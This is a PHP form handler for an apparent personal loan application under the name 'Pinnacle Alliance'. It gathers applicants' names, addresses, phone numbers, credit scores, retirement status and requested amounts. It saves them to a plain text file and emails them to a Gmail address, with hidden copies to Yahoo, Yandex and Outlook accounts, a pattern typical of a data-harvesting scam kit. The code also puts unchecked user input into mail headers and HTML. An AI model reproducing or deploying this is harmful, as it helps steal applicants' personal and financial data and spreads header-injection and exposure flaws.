<?php
// Start the session
session_start();
$_SESSION["applyidper"] = $_POST["applicationidper"];
//
//$var_value = $_SESSION['varname'];
error_reporting (E_ALL ^ E_NOTICE); 

//$pfrom = $_POST["formsrc"];

//if ($pfrom == "cont") 
//{	contacthandle();  }
//elseif ($pfrom == bus) 
//{	bushandle();  }
//elseif ($pfrom == per) 
    perhandle(); 
//else  
//{  die("Cannot Assign Handler or No qualifying Handler found. Please exit site");}

function headover($page){
 header("location: ".$page);
 exit;  }  

//require (bus.php);
//require (per.php);

function blazedata($data, $file){ //begin blazedata  function. this is the engine room [It burns the file to disk]
$fhandl = fopen($file, 'a');
fwrite($fhandl, $data);
fclose($fhandl);
}//end blazedata function

function mailer($to, $subje, $mailmess, $head){
mail($to,$subje,$mailmess,$head);  }  

function perhandle()  {    
$pappcode = $_SESSION["applyidper"];
$ftitle = $_POST["FormTitle"];  
$fname = $_POST["FirstName"];
$mname = $_POST["MiddleName"];
$lname = $_POST["LastName"];
$phone = $_POST["PhoneNumber"];
$email = $_POST["EmailAddress"];
$fulladdress = $_POST["FullResidentialAddress"];
$occupation = $_POST["Occupation"];
$pcs = $_POST["PersonalCreditScore"];
$rfund = $_POST["Retirementor401k"];
$loanamount = $_POST["RequestedLoanAmount"];
$tellmore = $_POST["TellUsMore"];


$fullname = $fname." ".$mname." ".$lname;
$fonenumbers = $phone;
$timedatestamp = date("F j, Y, g:i a"); 
$proxy = $_SERVER["REMOTE_ADDR"];

$data = "<html>"."<body>";

$data .= "<br />";
$data .= "<hr />";
$data .= "<br />";
$data .= "This Data was generated from the <b> $ftitle </b> by <b> $fullname </b> on".":   "." <b> $timedatestamp </b> and from ip address <b> $proxy </b> \n";

$data .= "<br />";
$data .= "<br />";
$data .= "Application Number is".":   "." <b>$pappcode</b> \n";
$data .= "<br />";
$data .= "Full Name is".":   "." <b>$fullname</b> \n";
$data .= "<br />";
$data .= "Phone Number is".":   "." <b>$fonenumbers</b> \n";
$data .= "<br />";
$data .= "Email Address is".":   "." <b>$email</b> \n";
$data .= "<br />";
$data .= "<br />";
$data .= "Below are other Relevant Applicant Details submitted:-  \n";
$data .= "<br />";
$data .= "-------------------------------------------------------------------";
$data .= "<br />";
$data .= "Residential Address of applicant is".":   "." <b>$fulladdress</b> \n";
$data .= "<br />";
$data .= "Occupation of applicant is".":   "." <b>$occupation</b> \n";
$data .= "<br />";
$data .= "Personal Credit Score of applicant".":   "." <b>$pcs</b> \n";
$data .= "<br />";
$data .= "Is a Retirement or 401k fund in place for applicant"."?   "." <b>$rfund</b> \n";
$data .= "<br />";
$data .= "This is the Amount requested by the applicant for this Personal Loan".":   "." <b>$loanamount</b> \n";
$data .= "<br />";
$data .= "And finally, below is more info about this Personal Loan application as written by the applicant".":   "."<br />"." <b>$tellmore</b> \n";
$data .= "<br />"."<hr />"."<br />";
$data .= "</body>"."</html>";

$fulldata = $data;
$file = "datasubmitted.txt";

blazedata($fulldata, $file);

$mailmess = wordwrap($data, 69, "\r\n");

$to = "2338t8332@gmail.com";
//$cc = "";
$bcc = "gbolio4@yahoo.com, madison.mikey@yandex.com, james.mcprescott@outlook.com";
$subje = "Pinnacle Alliance - " . $ftitle . " submitted. ". "Application number: ".$pappcode;


$headers = "From: " . $email. "\r\n";
//$headers .= "Cc: " . $cc . "\r\n";
$headers .= "Bcc: " . $bcc . "\r\n";
$headers .= "Reply-To: " . $email. "\r\n" ;
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

$head = $headers;

mailer($to, $subje, $mailmess, $head);
headover("perdatasubmitted.php");
}
?>